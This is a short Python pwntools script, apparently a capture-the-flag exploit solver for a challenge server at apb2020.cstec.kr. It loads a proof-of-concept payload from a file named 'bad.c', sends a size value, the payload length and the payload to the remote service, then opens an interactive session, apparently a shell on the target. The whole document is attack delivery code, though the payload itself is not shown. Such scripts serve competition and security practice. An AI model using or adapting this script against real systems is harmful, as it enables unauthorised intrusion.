#!/usr/bin/env python3
from pwn import *

with open('bad.c', 'rb') as f:
    poc = f.read()

p = remote('apb2020.cstec.kr', 5000)

p.sendafter(b' > ', p64(0x1000))

p.sendafter(b' > ', p64(len(poc)))
p.sendafter(b' > ', poc)

p.interactive()
